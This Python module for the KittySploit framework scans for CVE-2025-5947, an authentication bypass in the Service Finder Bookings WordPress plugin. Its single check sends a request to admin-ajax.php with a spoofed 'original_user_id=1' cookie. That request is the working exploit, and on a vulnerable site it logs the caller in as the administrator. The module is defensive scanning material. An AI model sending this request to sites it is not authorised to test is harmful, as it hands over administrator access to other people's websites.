#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Service Finder Bookings WordPress plugin <= 6."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Service Finder Bookings - Authentication Bypass Detection',
        'description': 'Service Finder Bookings WordPress plugin <= 6.0 contains a privilege escalation caused by improper validation of user cookie in service_finder_switch_back() function, letting unauthenticated attackers login as any user including admins.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'wordpress', 'wp-plugin', 'wp', 'sf-booking', 'auth-bypass', 'cookie-spoofing', 'vuln', 'vkev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-bookings-plugin-6-0-authentication-bypass-via-user-switch-cookie-vulnerability',
            'https://github.com/advisories/GHSA-x2xx-4qhp-2vqx',
            'https://github.com/M4rgs/CVE-2025-5947_Exploit',
            'https://nvd.nist.gov/vuln/detail/CVE-2025-5947',
        ],
        'cve': 'CVE-2025-5947',
    }

    def run(self):
        path = '/wp-admin/admin-ajax.php?action=service_finder_switch_back'
        r = self.http_request(method='GET', path=path, allow_redirects=False, headers={'Cookie': 'original_user_id=1'})
        if not r or r.status_code not in (301, 302):
            return False
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        header_regexes = ('(?i)Location:.*\\/wp-admin\\/', '(?i)Set-Cookie:.*wordpress_logged_in_',)
        if any(re.search(rx, headers) for rx in header_regexes):
            self.set_info(severity='critical', reason='Service Finder Bookings - Authentication Bypass detected', path=path)
            return True
        return False

